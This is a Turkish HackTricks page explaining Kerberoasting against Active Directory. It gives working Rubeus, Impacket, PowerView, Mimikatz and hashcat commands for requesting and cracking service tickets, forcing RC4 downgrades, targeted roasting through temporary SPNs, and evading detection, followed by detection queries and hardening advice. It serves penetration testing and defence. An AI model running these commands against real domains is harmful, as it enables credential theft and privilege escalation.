# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, Active Directory'de (AD) bilgisayar hesapları hariç, kullanıcı hesapları altında çalışan hizmetlerle ilişkili TGS biletlerinin edinilmesine odaklanır. Bu biletler, kullanıcı parolalarından türetilen anahtarlarla şifrelenir ve kimlik bilgilerinin çevrimdışı kırılmasına olanak tanır. Bir hizmet için kullanıcı hesabı kullanıldığı, ServicePrincipalName (SPN) özelliğinin boş olmamasından anlaşılır.

Kimliği doğrulanmış herhangi bir etki alanı kullanıcısı TGS bileti isteyebilir; bu nedenle özel ayrıcalıklar gerekmez.<sup>[[4]](#references)[[5]](#references)</sup>

### Önemli Noktalar

- Kullanıcı hesapları altında çalışan hizmetlerin TGS biletlerini hedefler (yani SPN ayarlı hesapları; bilgisayar hesaplarını değil).
- Biletler, hizmet hesabının parolasından türetilen bir anahtarla şifrelenir ve çevrimdışı kırılabilir.
- Yükseltilmiş ayrıcalıklar gerekmez; kimliği doğrulanmış herhangi bir hesap TGS bileti isteyebilir.

> [!WARNING]
> Çoğu herkese açık araç, AES'e kıyasla daha hızlı kırılabildiğinden RC4-HMAC (etype 23) hizmet biletlerini istemeyi tercih eder. RC4 TGS hash'leri `$krb5tgs$23$*`, AES128 `$krb5tgs$17$*`, AES256 ise `$krb5tgs$18$*` ile başlar. Ancak birçok ortam yalnızca AES kullanımına geçiyor. Yalnızca RC4'ün önemli olduğunu varsaymayın.
> Ayrıca, “spray-and-pray” roasting yapmaktan kaçının. Rubeus'un varsayılan kerberoast işlevi tüm SPN'leri sorgulayıp bilet isteyebilir ve bu gürültülüdür. Önce ilgi çekici principal'ları numaralandırın ve hedefleyin.

### Hizmet hesabı sırları ve Kerberos şifrelemesinin maliyeti

Birçok hizmet hâlâ elle yönetilen parolalara sahip kullanıcı hesapları altında çalışıyor. KDC, bu parolalardan türetilen anahtarlarla hizmet biletlerini şifreleyip şifreli metni kimliği doğrulanmış herhangi bir principal'a verir. Bu nedenle kerberoasting, hesap kilitlemelerine veya DC telemetrisine takılmadan sınırsız sayıda çevrimdışı parola tahmini yapılmasına olanak tanır. Şifreleme modu, kırma kapasitesini belirler:

| Mod | Anahtar türetme | Şifreleme türü | Yaklaşık RTX 5090 hızı* | Notlar |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | Etki alanı + SPN'den oluşturulan principal başına salt ile 4.096 yinelemeli PBKDF2-HMAC-SHA1 | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 milyon tahmin/s | Salt, rainbow table'ları etkisiz kılar ancak kısa parolaların hızlı kırılmasına yine de olanak tanır. |
| RC4 + NT hash | Parolanın tek MD4 özeti (salt içermeyen NT hash); Kerberos her bilet için yalnızca 8 baytlık bir confounder ekler | etype 23 (`$krb5tgs$23$`) | ~4.18 **milyar** tahmin/s | AES'ten ~1000× daha hızlıdır; `msDS-SupportedEncryptionTypes` izin verdiğinde saldırganlar RC4'ü zorlar. |

*Matthew Green'in [Kerberoasting analizinde](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) aktarıldığı üzere Chick3nman'ın kıyaslama sonuçları.<sup>[[3]](#references)</sup>

RC4'ün confounder'ı yalnızca keystream'i rastgeleleştirir; her tahmin için gereken işi artırmaz. Hizmet hesapları rastgele sırlara (gMSA/dMSA, makine hesapları veya vault tarafından yönetilen dizeler) dayanmıyorsa, ele geçirme hızı yalnızca GPU kapasitesine bağlıdır. Yalnızca AES etype'lerini zorunlu kılmak saniyede milyarlarca tahmin yapılmasını sağlayan downgrade'i ortadan kaldırır; ancak zayıf, insan tarafından seçilmiş parolalar PBKDF2'ye rağmen kırılabilir.<sup>[[3]](#references)</sup>

### Saldırı

#### Linux

NetExec kullanarak kırılabilir biletleri istemeye ve bunları Hashcat ile kırmaya yönelik pratik, uçtan uca bir örnek [1]. referansında bulunabilir.<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Kerberoast kontrollerini içeren çok özellikli araçlar:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Kerberoastable kullanıcıları listeleyin

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technique 1: TGS talep edin ve bellekten döküm alın

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technique 2: Automatic tools

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Bir TGS isteği Windows Security Event 4769'u oluşturur (Bir Kerberos hizmet bileti istendi).

### OPSEC ve yalnızca AES kullanılan ortamlar

- AES kullanmayan hesaplar için bilerek RC4 isteyin:
  - Rubeus: `/rc4opsec`, AES kullanmayan hesapları listelemek için tgtdeleg kullanır ve RC4 hizmet biletleri ister.
  - Rubeus: kerberoast ile birlikte `/tgtdeleg` kullanıldığında da mümkün olan durumlarda RC4 istekleri tetiklenir.<sup>[[6]](#references)</sup>
- Sessizce başarısız olmak yerine yalnızca AES kullanan hesapları roast edin:
  - Rubeus: `/aes`, AES etkin hesapları listeler ve AES hizmet biletleri ister (etype 17/18).
  - Elinizde zaten bir TGT varsa (PTT ile veya bir .kirbi dosyasından), LDAP'i atlayıp `/ticket:<blob|path>` seçeneğini `/spn:<SPN>` veya `/spns:<file>` ile kullanabilirsiniz.
- Hedefleme, hız sınırlama ve daha az gürültü:
  - `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` ve `/jitter:<1-100>` kullanın.
  - Zayıf parolalara sahip olma olasılığı yüksek hesapları `/pwdsetbefore:<MM-dd-yyyy>` (eski parolalar) ile filtreleyin veya ayrıcalıklı OU'ları `/ou:<DN>` ile hedefleyin.<sup>[[8]](#references)</sup>

Örnekler (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Persistence / Abuse

Bir hesabı kontrol ediyor veya değiştirebiliyorsanız, bir SPN ekleyerek onu kerberoastable hâle getirebilirsiniz:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Daha kolay cracking için RC4'ü etkinleştirmek üzere hesabı downgrade edin (hedef nesne üzerinde yazma ayrıcalıkları gerektirir):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Bir kullanıcı üzerinde GenericWrite/GenericAll aracılığıyla Targeted Kerberoast (geçici SPN)

BloodHound bir kullanıcı nesnesi üzerinde kontrolünüz olduğunu gösterdiğinde (örn. GenericWrite/GenericAll), şu anda herhangi bir SPN’i olmasa bile bu kullanıcıyı güvenilir biçimde “targeted-roast” edebilirsiniz:<sup>[[9]](#references)</sup>

- Roast edilebilir hâle getirmek için kontrolünüzdeki kullanıcıya geçici bir SPN ekleyin.
- Cracking işlemini kolaylaştırmak için bu SPN’e yönelik RC4 (etype 23) ile şifrelenmiş bir TGS-REP isteyin.
- `$krb5tgs$23$...` hash’ini hashcat ile crack edin.
- Ayak izinizi azaltmak için SPN’i temizleyin.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux tek satırlık komut (targetedKerberoast.py, SPN ekleme -> TGS isteği (etype 23) -> SPN kaldırma işlemlerini otomatikleştirir):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Çıktıyı hashcat autodetect ile crack et (mode 13100, `$krb5tgs$23$` için):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Detection notları: SPN ekleme/kaldırma dizin değişikliklerine (hedef kullanıcıda Event ID 5136/4738), TGS isteği ise Event ID 4769'a neden olur. İstekleri aralıklı gönderin ve işlemin ardından hızlıca temizleyin.

Kerberoast saldırıları için faydalı araçları burada bulabilirsiniz: https://github.com/nidem/kerberoast

Linux'ta bu hatayı görürseniz: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, yerel saat farkından kaynaklanır. DC ile eşitleyin:

- `ntpdate <DC_IP>` (bazı dağıtımlarda kullanımdan kaldırılmıştır)
- `rdate -n <DC_IP>`

### Domain hesabı olmadan Kerberoast (AS-requested STs)

Eylül 2022'de Charlie Clark, bir principal için ön kimlik doğrulama gerekmiyorsa, isteğin gövdesindeki sname değiştirilerek hazırlanmış bir KRB_AS_REQ aracılığıyla hizmet bileti alınabileceğini gösterdi. Böylece etkili bir şekilde TGT yerine hizmet bileti alınır. Bu yöntem AS-REP roasting'e benzer ve geçerli domain kimlik bilgileri gerektirmez.

Ayrıntılar: Semperis'in “New Attack Paths: AS-requested STs” yazısı.<sup>[[10]](#references)</sup>

> [!WARNING]
> Geçerli kimlik bilgileri olmadan bu teknikle LDAP sorgusu yapamayacağınız için kullanıcı listesi sağlamalısınız.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

İlgili

AS-REP roast edilebilir kullanıcıları hedefliyorsanız, şuna da bakın:

{{#ref}}
asreproast.md
{{#endref}}

### Tespit

Kerberoasting gizli yürütülebilir. DC'lerde Event ID 4769 olaylarını araştırın ve gürültüyü azaltmak için filtreler uygulayın:

- `krbtgt` hizmet adını ve `$` ile biten hizmet adlarını (bilgisayar hesapları) hariç tutun.
- Makine hesaplarından gelen istekleri (`*$$@*`) hariç tutun.
- Yalnızca başarılı istekleri alın (Failure Code `0x0`).
- Şifreleme türlerini izleyin: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Yalnızca `0x17` için uyarı oluşturmayın.

Örnek PowerShell ön değerlendirmesi:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Additional ideas:

- Host/kullanıcı başına normal SPN kullanımını temel alın; tek bir principal'dan gelen çok sayıda farklı SPN isteğini uyarı olarak işaretleyin.
- AES ile güçlendirilmiş domain'lerde olağandışı RC4 kullanımını işaretleyin.

### Mitigation / Hardening

- Servisler için gMSA/dMSA veya machine account'lar kullanın. Managed account'ların 120+ karakterlik rastgele parolaları vardır ve bu parolalar otomatik olarak yenilenir; bu da offline cracking'i uygulanamaz hâle getirir.<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes` değerini yalnızca AES olacak şekilde (ondalık 24 / onaltılık 0x18) ayarlayarak servis account'larında AES'i zorunlu kılın; ardından AES key'lerinin türetilmesi için parolayı değiştirin.<sup>[[7]](#references)</sup>
- Mümkün olduğunda ortamınızda RC4'ü devre dışı bırakın ve RC4 kullanma girişimlerini izleyin. DC'lerde, `msDS-SupportedEncryptionTypes` ayarlanmamış account'lar için varsayılanları yönlendirmek üzere `DefaultDomainSupportedEncTypes` registry değerini kullanabilirsiniz. Kapsamlı testler yapın.
- Kullanıcı account'larından gereksiz SPN'leri kaldırın.<sup>[[7]](#references)</sup>
- Managed account'lar kullanılamıyorsa servis account'ları için uzun, rastgele parolalar (25+ karakter) kullanın; yaygın parolaları yasaklayın ve düzenli olarak denetleyin.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat ile uygulamada hash kırma](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Eski Kerberos şifrelemesinden kaynaklanan düşük teknikli, yüksek etkili saldırılar (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos kötüye kullanımı: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES etkin olduğunda RC4 şifreli TGS isteme](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoasting'i azaltmaya yardımcı olmak için Microsoft'un önerileri](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast komutu belgeleri](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL kimlik bilgileri → Targeted Kerberoast → Unconstrained Delegation → DA'ya DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Yeni saldırı yolları mı? AS ile istenen servis ticket'ları (Charlie Clark, Eylül 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
